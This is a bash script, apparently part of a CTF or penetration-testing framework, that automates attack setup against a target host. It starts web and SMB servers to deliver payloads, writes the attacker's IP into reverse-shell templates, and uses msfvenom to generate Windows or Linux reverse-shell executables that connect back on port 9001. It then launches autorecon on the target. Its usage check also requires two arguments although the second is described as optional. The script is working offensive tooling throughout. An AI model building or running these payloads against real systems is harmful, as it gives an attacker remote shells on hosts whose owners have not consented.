#!/bin/bash

if [ $# -lt 2 ];
then
    echo "usage: $0 <hostname> [os]=lin|win (default=lin)"
    echo "! don't forget to add <hostname> to /etc/hosts"

    exit 1
fi


source "${ctf_framework_path}/colors.sh"
source "${ctf_framework_path}/functions.sh"

target=$1
target_os=$2
[ -z "${target_os}" ] && target_os="lin"

ctf_framework_www_path="${ctf_framework_path}/www/${target_os}"
revshell_templates_dir="${ctf_framework_path}/templates/revshells/${target_os}"

# catch ctrl+c so we can handle it
trap ctrl_c INT
function ctrl_c
{
    # cleanup

    # reset the terminal
    reset
}

echo "------------------------------------------------"
echo_yellow "[*] starting auto PWN scripts..."

# dirs
declare -a directories=(
    "exploits"
    "files"
    "ftp"
    "requests"
    "sources"
)
echo_green "[*] creating directories..."
for directory in "${directories[@]}"
do
    cmd="mkdir \"./${directory}\""
    echo_green "[*] ${cmd}"
    eval "${cmd}"    
done

# files
declare -a files=(
    "creds.txt"
    "hashes.txt"
)
echo_green "[*] creating files..."
for file in "${files[@]}"
do
    cmd="touch \"./${file}\""
    echo_green "[*] ${cmd}"
    eval "${cmd}"
done

# symbolic links
ln -s "${ctf_framework_www_path}" "./www"

# start the web/smb servers
echo_yellow "[*] starting Python Web Server..."
bash "${ctf_framework_path}/bin/run_python_web_server_gnome_terminal.sh" "${ctf_framework_www_path}"

if [ "${target_os}" == "win" ]
then
    echo_yellow "[*] starting SAMBA Server..."
    #mkdir "${smb_server_share_name}"; bash "${ctf_framework_path}/bin/run_smb_share_gnome_terminal.sh" "$(pwd)/${smb_server_share_name}"
    mkdir "${smb_server_share_name}"; bash "${ctf_framework_path}/bin/run_smb_share_gnome_terminal.sh" "${ctf_framework_www_path}"
fi

get_ip_address

# update the revshells with current ip address
echo_yellow "[*] generating reverse shells for local ip ${ip_addr}..."

ip_addr_mark="<<LOCAL_IP_ADDRESS>>"

for file_name in $(ls ${revshell_templates_dir})
do
    file_path="${revshell_templates_dir}/${file_name}"    
    updated_file="${ctf_framework_www_path}/${file_name}"
    
    cmd="cat '${file_path}' | sed 's/${ip_addr_mark}/${ip_addr}/' > '${updated_file}'"    
    eval "${cmd}"
done


# generate revshells - exe
echo_yellow "[*] generating binary revshells for '${target_os}' local ip ${ip_addr}..."

if [ "${target_os}" == "win" ]
then
    cmd="msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=${ip_addr} LPORT=9001 -f exe -o \"${ctf_framework_www_path}/rev32.exe\" &"
    echo_yellow "[*] ${cmd}"
    eval "${cmd}"

	cmd="msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=${ip_addr} LPORT=9001 -f exe -o \"${ctf_framework_www_path}/rev64.exe\" &"
	echo_yellow "[*] ${cmd}"
    eval "${cmd}"

elif [ "${target_os}" == "lin" ]
then
    cmd="msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=${ip_addr} LPORT=9001 -f elf -o \"${ctf_framework_www_path}/rev32\" &"
    echo_yellow "[*] ${cmd}"
    eval "${cmd}"

	cmd="msfvenom --platform linux -p linux/x64/shell_reverse_tcp LHOST=${ip_addr} LPORT=9001 -f elf -o \"${ctf_framework_www_path}/rev64\" &"
    echo_yellow "[*] ${cmd}"
    eval "${cmd}"
fi


echo_yellow "[*] starting autorecon on target: '${target}' with OS '${target_os}'..."

exec_wrapper autorecon "${target}"

